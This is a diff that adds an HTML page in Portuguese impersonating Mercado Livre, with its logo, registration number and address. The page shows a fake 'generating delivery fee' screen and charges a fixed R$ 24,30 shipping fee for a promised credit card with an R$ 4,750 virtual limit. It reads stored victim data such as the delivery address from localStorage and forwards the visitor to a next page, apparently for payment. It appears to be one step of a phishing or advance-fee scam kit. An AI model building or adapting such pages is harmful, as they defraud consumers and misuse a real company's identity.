@@ -1,0 +1,1046 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+  window.googlePixelId = "694a28d20933edb83f74a17a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel-google.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title> - Confirmação de Entrega</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #F5F7FA 0%, #C3CFE2 100%);
+            min-height: 100vh;
+            color: #000000;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background Elements */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ffe600, #ffe600);
+        }
+
+        .decoration1 {
+            width: 200px;
+            height: 200px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+
+        .decoration2 {
+            width: 150px;
+            height: 150px;
+            bottom: 10%;
+            left: 5%;
+            animation: float2 25s infinite ease-in-out;
+        }
+
+        .decoration3 {
+            width: 100px;
+            height: 100px;
+            top: 50%;
+            left: 50%;
+            animation: float3 30s infinite ease-in-out;
+        }
+
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-20px, 20px) scale(1.1); }
+        }
+
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(20px, -20px) scale(0.9); }
+        }
+
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #ffe600 0%, #ffe600 100%);
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(255, 217, 0, 0.3);
+            position: relative;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #ffe600, transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .logo-img {
+            height: 60px;
+            width: auto;
+            filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1));
+        }
+
+        /* Container */
+        .container {
+            max-width: 520px;
+            margin: 40px auto;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 25px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 217, 0, 0.2);
+            border-top: 4px solid #ffe600;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #000000;
+            line-height: 1.3;
+            margin-bottom: 15px;
+        }
+
+        .loading-subtext {
+            font-size: 16px;
+            color: #7F8C8D;
+            line-height: 1.5;
+            opacity: 0.8;
+        }
+
+        /* Success Screen */
+        .success-screen {
+            display: none;
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .main-title {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #2C3E50, #34495E);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            text-align: center;
+            animation: titleAppear 1s ease-out;
+        }
+
+        @keyframes titleAppear {
+            from { transform: translateY(-10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #7F8C8D;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            text-align: center;
+            animation: fadeIn 1s ease-out 0.3s both;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .subtitle strong {
+            color: #27AE60;
+            font-weight: 600;
+            text-shadow: 0 1px 3px rgba(39, 174, 96, 0.2);
+        }
+
+        /* Success Message */
+        .success-message {
+            background: linear-gradient(135deg, #E8F5E8, #D4F1D4);
+            border: 2px solid #4CAF50;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 8px 25px rgba(76, 175, 80, 0.15);
+            animation: successPulse 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .success-message::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: successShimmer 1.5s ease-out 0.5s;
+        }
+
+        @keyframes successPulse {
+            0% { transform: scale(0.95); opacity: 0; }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes successShimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .success-icon {
+            background: linear-gradient(135deg, #4CAF50, #45A049);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+            animation: iconBounce 0.8s ease-out 0.3s;
+        }
+
+        @keyframes iconBounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-8px); }
+            60% { transform: translateY(-4px); }
+        }
+
+        .success-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2E7D32;
+            text-shadow: 0 1px 3px rgba(46, 125, 50, 0.1);
+        }
+
+        /* Info Cards */
+        .info-card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.9));
+            border: 2px solid #E8E8E8;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+            animation: cardSlideIn 0.6s ease-out;
+        }
+
+        .info-card:nth-child(even) {
+            animation-delay: 0.2s;
+        }
+
+        .info-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(135deg, #ffe600, #ffe600);
+            transform: scaleY(0);
+            transition: transform 0.3s ease;
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.12);
+        }
+
+        .info-card:hover::before {
+            transform: scaleY(1);
+        }
+
+        @keyframes cardSlideIn {
+            from { transform: translateX(-20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .card-title {
+            font-size: 22px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #2C3E50, #34495E);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-title::before {
+            content: '■';
+            color: #ffe600;
+            font-size: 12px;
+            animation: titleIconSpin 2s ease-in-out infinite;
+        }
+
+        .card-title.shipping-title::before {
+            content: '▲';
+            color: #4CAF50;
+        }
+
+        @keyframes titleIconSpin {
+            0%, 100% { transform: rotate(0deg); }
+            50% { transform: rotate(45deg); }
+        }
+
+        .address-info {
+            background: linear-gradient(135deg, #F8F9FA, #E9ECEF);
+            border-radius: 15px;
+            padding: 20px;
+            color: #495057;
+            line-height: 1.8;
+            font-size: 16px;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .address-info::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            width: 20px;
+            height: 20px;
+            background-image: url('images/mapa.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.8;
+            animation: locationPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes locationPulse {
+            0%, 100% { 
+                opacity: 0.8; 
+                transform: scale(1);
+            }
+            50% { 
+                opacity: 1; 
+                transform: scale(1.1);
+            }
+        }
+
+        .address-label {
+            font-weight: 600;
+            color: #2C3E50;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .address-label::before {
+            content: '';
+            width: 20px;
+            height: 20px;
+            background-image: url('images/casa.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .shipping-details {
+            background: linear-gradient(135deg, #F8F9FA, #E9ECEF);
+            border-radius: 15px;
+            padding: 20px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .shipping-info {
+            flex: 1;
+            width: 100%;
+        }
+
+        .price-section {
+            text-align: center;
+            margin: 15px 0;
+            padding: 15px 0;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .price-section::before {
+            content: '';
+            width: 50px;
+            height: 1px;
+            background: #E8E8E8;
+            margin-bottom: 10px;
+        }
+
+        .shipping-price {
+            font-size: 32px;
+            font-weight: 600;
+            color: #2C3E50;
+            letter-spacing: 1px;
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+            width: 100%;
+            margin: 0;
+        }
+
+        .shipping-price::before {
+            content: 'TOTAL DO ENVIO';
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #7F8C8D;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+            text-align: center;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-method {
+            font-size: 24px;
+            font-weight: 700;
+            color: #2C3E50;
+            margin-bottom: 10px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-time {
+            font-size: 16px;
+            color: #6C757D;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-time::before {
+            content: '◉';
+            color: #3498DB;
+            font-size: 12px;
+        }
+
+        .shipping-features {
+            font-size: 14px;
+            color: #28A745;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(40, 167, 69, 0.1);
+            padding: 8px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(40, 167, 69, 0.2);
+            width: fit-content;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-features::before {
+            content: '✓';
+            color: #28A745;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        /* Button */
+        .confirm-button {
+            background: linear-gradient(135deg, #ffe600, #ffe600);
+            color: #000000;
+            padding: 22px 50px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(255, 217, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: buttonPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .confirm-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.6s ease;
+            transform: translateY(-50%);
+        }
+
+        .confirm-button:hover {
+            background: linear-gradient(135deg, #ffe600, #FFB000);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255, 217, 0, 0.5);
+        }
+
+        .confirm-button:hover::before {
+            left: 100%;
+        }
+
+        .confirm-button:active {
+            transform: translateY(-1px);
+        }
+
+        /* Virtual Card Section */
+        .virtual-card-section {
+            background: linear-gradient(135deg, #F0F8F0, #E8F5E8);
+            border: 2px solid #C8E6C9;
+            border-radius: 20px;
+            padding: 30px;
+            margin: 25px 0;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            box-shadow: 0 10px 30px rgba(200, 230, 201, 0.2);
+            position: relative;
+            overflow: hidden;
+            animation: cardGlow 4s ease-in-out infinite;
+        }
+
+        @keyframes cardGlow {
+            0%, 100% { box-shadow: 0 10px 30px rgba(200, 230, 201, 0.2); }
+            50% { box-shadow: 0 15px 40px rgba(200, 230, 201, 0.4); }
+        }
+
+        .virtual-card-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: virtualShimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes virtualShimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .virtual-card-icon {
+            background: linear-gradient(135deg, #4CAF50, #45A049);
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
+            animation: cardIconSpin 6s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+            background-image: url('images/cartoes-de-credito.png');
+            background-size: 30px 30px;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .virtual-card-icon img {
+            display: none;
+        }
+
+        .virtual-card-icon::before {
+            content: '●';
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            font-size: 8px;
+            color: #ffe600;
+            animation: sparkle 2s ease-in-out infinite;
+        }
+
+        @keyframes cardIconSpin {
+            0%, 100% { transform: rotate(0deg); }
+            50% { transform: rotate(5deg); }
+        }
+
+        @keyframes sparkle {
+            0%, 100% { opacity: 0; transform: scale(0.5); }
+            50% { opacity: 1; transform: scale(1); }
+        }
+
+        .virtual-card-content {
+            flex: 1;
+        }
+
+        .virtual-card-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2E7D32;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .virtual-card-title::before {
+            content: '◉';
+            color: #4CAF50;
+            font-size: 14px;
+        }
+
+        .virtual-card-text {
+            font-size: 15px;
+            color: #2E7D32;
+            line-height: 1.6;
+        }
+
+        .highlight {
+            font-weight: 700;
+            background: linear-gradient(135deg, #E74C3C, #C0392B);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 18px;
+            text-shadow: 0 2px 10px rgba(231, 76, 60, 0.3);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px 20px;
+            background: #FAFAFA;
+            border-top: 1px solid #E8E8E8;
+            margin-top: 50px;
+        }
+
+        .footer-company {
+            font-weight: 700;
+            color: #000000;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .footer p {
+            color: #7F8C8D;
+            font-size: 12px;
+            margin: 3px 0;
+            line-height: 1.5;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 500px) {
+            .bg-decoration .decoration {
+                display: none;
+            }
+
+            .container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            
+            .main-title, .loading-text {
+                font-size: 24px;
+            }
+            
+            .info-card {
+                padding: 20px;
+            }
+            
+            .virtual-card-section {
+                padding: 20px;
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+
+            .shipping-details {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .shipping-price {
+                text-align: center;
+                align-self: center;
+            }
+
+            .shipping-method {
+                font-size: 20px;
+            }
+
+            .confirm-button {
+                padding: 20px 40px;
+                font-size: 16px;
+            }
+
+            .virtual-card-icon {
+                width: 40px;
+                height: 40px;
+                font-size: 20px;
+            }
+
+            .address-info::before {
+                top: 10px;
+                right: 10px;
+                font-size: 16px;
+            }
+        }
+
+        /* Additional Background Decorations */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ffe600, #ffe600);
+        }
+
+        .decoration1 {
+            width: 200px;
+            height: 200px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+
+        .decoration2 {
+            width: 150px;
+            height: 150px;
+            bottom: 10%;
+            left: 5%;
+            animation: float2 25s infinite ease-in-out;
+        }
+
+        .decoration3 {
+            width: 100px;
+            height: 100px;
+            top: 50%;
+            left: 50%;
+            animation: float3 30s infinite ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+
+    <div class="header">
+        <img src="images/logomerc.png" alt="" class="logo-img">
+    </div>
+
+    <div class="container">
+        <!-- Loading Screen -->
+        <div class="loading-screen" id="loadingScreen">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Gerando a taxa de entrega...</div>
+            <div class="loading-subtext">Aguarde um momento</div>
+        </div>
+
+        <!-- Success Screen -->
+        <div class="success-screen" id="successScreen">
+            <h1 class="main-title">Confirmação de Entrega</h1>
+            <p class="subtitle">Confirme os detalhes do seu pedido antes de finalizar</p>
+
+            <div class="success-message">
+                <div class="success-icon">✓</div>
+                <div class="success-text">Taxa de envio gerada com sucesso!</div>
+            </div>
+
+            <div class="info-card">
+                <div class="card-title">Detalhes do Envio</div>
+                <div class="address-info">
+                    <span class="address-label">Endereço de entrega:</span>
+                    <div id="endereco-entrega">Carregando endereço...</div>
+                </div>
+            </div>
+
+            <div class="info-card">
+                <div class="card-title shipping-title">Método de Envio</div>
+                <div class="shipping-details">
+                    <div class="shipping-info">
+                        <div class="shipping-method" id="metodo-envio">Carregando...</div>
+                        <div class="shipping-time" id="prazo-envio">Carregando prazo...</div>
+                        <div class="shipping-features">Rastreamento incluído</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="price-section">
+                <div class="shipping-price" id="preco-envio">R$ 0,00</div>
+            </div>
+
+            <button class="confirm-button" onclick="confirmarEnvio()">SIM, VOU QUERER!</button>
+
+            <div class="virtual-card-section">
+                <div class="virtual-card-icon">
+                    <img src="images/sem-contato.png" alt="Cartão">
+                </div>
+                <div class="virtual-card-content">
+                    <div class="virtual-card-title">Cartão Virtual Disponível Hoje</div>
+                    <div class="virtual-card-text">
+                        Você receberá hoje seu cartão virtual com limite de <span class="highlight">R$ 4.750</span> para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="footer-company">Mercado Livre | 23.862.762/0001-00</p>
+        <p>Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903</p>
+        <p>© 2025 - Todos os direitos reservados</p>
+    </div>
+
+    <script>
+        // Carregamento real dos dados das páginas anteriores
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('📱 Página de confirmação PAC carregada, iniciando loading...');
+            
+            // Carrega dados existentes no localStorage
+            try {
+                const dadosExistentes = JSON.parse(localStorage.getItem('Mercado Librebank_userdata') || '{}');
+                dadosExistentes.pagina_confirmacao_pac_acesso = new Date().toISOString();
+                dadosExistentes.url_atual = window.location.href;
+                localStorage.setItem('Mercado Librebank_userdata', JSON.stringify(dadosExistentes));
+            } catch(e) {
+                console.log('Erro ao carregar dados:', e);
+            }
+            
+            setTimeout(() => {
+                console.log('✅ Loading completo, mostrando tela de confirmação...');
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+                
+                // Carrega e exibe o endereço e método de envio
+                carregarEndereco();
+                carregarMetodoEnvio();
+            }, 3000); // 3 segundos de loading
+        });
+
+        function carregarEndereco() {
+            const enderecoDiv = document.getElementById('endereco-entrega');
+            
+            try {
+                const dadosUsuario = JSON.parse(localStorage.getItem('Mercado Librebank_userdata') || '{}');
+                console.log('📥 Carregando endereço da página anterior...');
+                console.log('📊 Dados disponíveis:', dadosUsuario);
+                
+                // Busca endereço nos dados salvos
+                const endereco = dadosUsuario.endereco_entrega || 
+                                 dadosUsuario.endereco || 
+                                 dadosUsuario.address ||
+                                 dadosUsuario.delivery_address ||
+                                 null;
+                
+                console.log('🏠 Endereço encontrado:', endereco);
+                
+                if (endereco && typeof endereco === 'object') {
+                    let enderecoFormatado = '';
+                    
+                    if (endereco.endereco_completo) {
+                        enderecoFormatado = endereco.endereco_completo;
+                    } else if (endereco.endereco_simples) {
+                        enderecoFormatado = endereco.endereco_simples;
+                    } else {
+                        enderecoFormatado = montarEnderecoFromCampos(endereco);
+                    }
+                    
+                    if (enderecoFormatado && enderecoFormatado.length > 5) {
+                        enderecoDiv.innerHTML = enderecoFormatado;
+                    } else {
+                        enderecoDiv.innerHTML = 'Endereço cadastrado nas etapas anteriores';
+                    }
+                } else {
+                    enderecoDiv.innerHTML = '<em style="color: #7F8C8D;">Endereço será confirmado durante o processo de entrega</em>';
+                }
+            } catch(e) {
+                console.log('Erro ao carregar endereço:', e);
+                enderecoDiv.innerHTML = '<em style="color: #7F8C8D;">Endereço será confirmado durante o processo de entrega</em>';
+            }
+        }
+
+        function montarEnderecoFromCampos(endereco) {
+            const rua = endereco.endereco || endereco.rua || endereco.street || '';
+            const numero = endereco.numero || endereco.number || '';
+            const complemento = endereco.complemento || endereco.complement || '';
+            const bairro = endereco.bairro || endereco.district || '';
+            const cidade = endereco.cidade || endereco.city || '';
+            const estado = endereco.estado || endereco.uf || endereco.state || '';
+            const cep = endereco.cep || endereco.zipcode || '';
+            
+            let resultado = '';
+            
+            if (rua) {
+                resultado += rua;
+                if (numero) resultado += `, ${numero}`;
+                if (complemento) resultado += `, ${complemento}`;
+                resultado += '<br>';
+            }
+            
+            if (bairro || cidade) {
+                if (bairro) resultado += bairro;
+                if (bairro && cidade) resultado += ' - ';
+                if (cidade) resultado += cidade;
+                if (estado && (bairro || cidade)) resultado += `/${estado}`;
+                resultado += '<br>';
+            }
+            
+            if (cep) {
+                resultado += `CEP: ${cep}`;
+            }
+            
+            return resultado;
+        }
+
+        function carregarMetodoEnvio() {
+            console.log('📦 Carregando método de envio PAC...');
+            
+            // Valores fixos para PAC
+            const nomeMetodo = 'PAC';
+            const tempoEntrega = '15-20 dias úteis';
+            const precoEnvio = 'R$ 24,30';
+            
+            // Atualiza os elementos na página
+            document.getElementById('metodo-envio').textContent = nomeMetodo;
+            document.getElementById('prazo-envio').textContent = `Prazo de entrega: ${tempoEntrega}`;
+            document.getElementById('preco-envio').textContent = precoEnvio;
+            
+            console.log('✅ Método PAC carregado:', {
+                nome: nomeMetodo,
+                tempo: tempoEntrega,
+                preco: precoEnvio
+            });
+        }
+
+        function confirmarEnvio() {
+            // Salva dados no localStorage (SEM passar via URL)
+            try {
+                const dadosExistentes = JSON.parse(localStorage.getItem('Mercado Librebank_userdata') || '{}');
+                dadosExistentes.etapa_atual = 'confirmacao_envio_final';
+                dadosExistentes.envio_confirmado = true;
+                dadosExistentes.confirmacao_data = new Date().toISOString();
+                dadosExistentes.metodo_confirmado = 'PAC';
+                dadosExistentes.preco_confirmado = '24,30';
+                localStorage.setItem('Mercado Librebank_userdata', JSON.stringify(dadosExistentes));
+                console.log('✅ Dados salvos no localStorage:', dadosExistentes);
+            } catch(e) {
+                console.log('Erro ao salvar:', e);
+            }
+            
+            // MÉTODO ULTRA-SIMPLES: Pegar parâmetros da URL atual e repassar
+            const urlAtual = window.location.search; // Pega a query string completa
+            
+            // Se tem parâmetros, repassa. Se não tem, vai sem parâmetros.
+            const proximaUrl = urlAtual ? `14-2.html${urlAtual}` : '14-2.html';
+            
+            console.log('URL atual:', window.location.href);
+            console.log('Query string:', urlAtual);
+            console.log('Próxima URL:', proximaUrl);
+            console.log('Envio PAC confirmado!');
+            
+            // Redirecionar para próxima página
+            window.location.href = proximaUrl;
+        }
+    </script>
+
+</body></html>
